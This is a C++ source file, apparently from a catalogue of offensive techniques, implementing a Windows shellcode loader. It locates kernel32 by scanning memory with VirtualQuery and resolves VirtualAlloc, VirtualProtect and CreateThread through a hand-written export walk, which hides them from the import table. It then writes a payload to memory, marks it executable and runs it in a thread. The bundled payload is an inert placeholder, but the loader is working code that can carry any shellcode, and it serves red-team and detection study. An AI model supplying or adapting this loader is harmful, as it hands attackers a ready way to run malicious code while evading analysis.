/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve module by scanning process memory with VirtualQuery.
    Functions are then resolved via manual PE export walk by name.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp

Technique:
    - access:       module-enumeration VirtualQuery (module resolution)
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread

Note:
    - resolve_module: scan address space with VirtualQuery, filter MEM_IMAGE
      regions, validate PE headers, and match IMAGE_EXPORT_DIRECTORY.Name.
    - resolve_name: manual export walk by name (see dynamic-load/manual-name).
    - VirtualQuery is called directly (linker import); real shellcode must
      resolve it separately (PEB bootstrap, IAT parse, or NtQueryVirtualMemory).
    - other module-enumeration techniques: see access/module-enumeration/
*/

#include <windows.h>
#include <stdint.h>

/* ========= function signatures ========= */
typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef VirtualAlloc_t        FAR * pVirtualAlloc;
typedef VirtualProtect_t      FAR * pVirtualProtect;
typedef VirtualFree_t         FAR * pVirtualFree;
typedef CreateThread_t        FAR * pCreateThread;
typedef WaitForSingleObject_t FAR * pWaitForSingleObject;


/* =================== compare and resolvers =================== */

static wchar_t wchar_lower (wchar_t c)
{
    if (c >= L'A' && c <= L'Z')
        return c + (L'a' - L'A');
    return c;
}

static char char_lower (char c)
{
    if (c >= 'A' && c <= 'Z')
        return c + ('a' - 'A');
    return c;
}

/*
    Case-insensitive compare between a wide target name and an ASCII export name.
    No CRT or loader APIs used.
*/
static BOOL module_name_equal (const wchar_t * target, const char * export_name)
{
    while (*target && *export_name)
    {
        if (wchar_lower (*target) != (wchar_t) char_lower (*export_name))
            return FALSE;
        target++;
        export_name++;
    }
    return *target == 0 && *export_name == 0;
}

/*
    Compare two null-terminated ASCII strings byte by byte.
    No CRT or loader APIs used.
*/
static BOOL name_equal (const char * a, const char * b)
{
    while (*a && *b)
    {
        if (*a != *b)
            return FALSE;
        a++;
        b++;
    }
    return *a == *b;
}

/*
    Validate that base points to a plausible PE image in memory.
*/
static BOOL is_valid_pe (PVOID base)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;

    if (base == NULL)
        return FALSE;

    dos = (PIMAGE_DOS_HEADER) base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    if (dos->e_lfanew < (LONG) sizeof (IMAGE_DOS_HEADER) || dos->e_lfanew > 0x1000)
        return FALSE;

    nt = (PIMAGE_NT_HEADERS) ((PBYTE) base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    return TRUE;
}

/*
    Return the module name from IMAGE_EXPORT_DIRECTORY.Name, or NULL.
*/
static const char * get_export_name (PVOID base)
{
    PBYTE                   image = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos   = (PIMAGE_DOS_HEADER) image;
    PIMAGE_NT_HEADERS       nt    = (PIMAGE_NT_HEADERS) (image + dos->e_lfanew);
    DWORD                   exp_rva;
    PIMAGE_EXPORT_DIRECTORY exp;

    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exp_rva == 0)
        return NULL;

    exp = (PIMAGE_EXPORT_DIRECTORY) (image + exp_rva);
    if (exp->Name == 0)
        return NULL;

    return (const char *) (image + exp->Name);
}

/*
    Resolve the module by name.

    Scan the process address space with VirtualQuery, inspect MEM_IMAGE
    regions, validate PE headers, and match IMAGE_EXPORT_DIRECTORY.Name.

    Args:
        target_dll:   name of the module to search for

    Returns:
        base address of the module if found, otherwise NULL
*/
static PVOID resolve_module (const wchar_t * target_dll)
{
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID                   addr = NULL;
    const char             * name;

    // iterate all possible consecutive-pages memory regions, start from 0 (NULL)
    while (VirtualQuery (addr, &mbi, sizeof (mbi)) == sizeof (mbi))
    {
        // MEM_COMMIT + MEM_IMAGE = memory region contain executable file image and mapped to physical storage
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_IMAGE)
        {
            // ensure the memory region is valid PE
            if (mbi.BaseAddress == mbi.AllocationBase && is_valid_pe (mbi.AllocationBase))
            {
                name = get_export_name (mbi.AllocationBase);
                if (name != NULL && module_name_equal (target_dll, name))
                    return mbi.AllocationBase;
            }
        }

        // iterate to the next memory region
        addr = (LPVOID) ((ULONG_PTR) mbi.BaseAddress + mbi.RegionSize);
        if ((ULONG_PTR) addr < (ULONG_PTR) mbi.BaseAddress)
            break;
    }

    return NULL;
}

/*
    Search for the function by name in the single loaded module.
    Walk the export table and compare the name.

    Args:
        base:           base address of the module (HMODULE / DllBase)
        target_name:    name of the function to search for

    Returns:
        address of the function if found, otherwise NULL
*/
static FARPROC resolve_name (PVOID base, const char * target_name)
{
    PBYTE                   image = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos   = (PIMAGE_DOS_HEADER) image;
    PIMAGE_NT_HEADERS       nt    = (PIMAGE_NT_HEADERS) (image + dos->e_lfanew);
    DWORD                   exp_rva;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD  * names;
    WORD   * ordinals;
    DWORD  * funcs;
    DWORD    i;

    // get the RVA of the export table
    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exp_rva == 0)
        return NULL;

    // resolve the name
    exp      = (PIMAGE_EXPORT_DIRECTORY) (image + exp_rva);
    names    = (DWORD *) (image + exp->AddressOfNames);
    ordinals = (WORD *)  (image + exp->AddressOfNameOrdinals);
    funcs    = (DWORD *) (image + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++)
    {
        const char * fn_name = (const char *) (image + names[i]);
        if (name_equal (fn_name, target_name))
            return (FARPROC) (image + funcs[ordinals[i]]);
    }

    return NULL;
}


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    PVOID kernel32;

    // resolve module base via VirtualQuery memory scan, then each function by export name
    kernel32               = resolve_module (L"kernel32.dll");
    fn_VirtualAlloc        = (pVirtualAlloc)        resolve_name (kernel32, "VirtualAlloc");
    fn_VirtualProtect      = (pVirtualProtect)      resolve_name (kernel32, "VirtualProtect");
    fn_VirtualFree         = (pVirtualFree)         resolve_name (kernel32, "VirtualFree");
    fn_CreateThread        = (pCreateThread)        resolve_name (kernel32, "CreateThread");
    fn_WaitForSingleObject = (pWaitForSingleObject) resolve_name (kernel32, "WaitForSingleObject");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
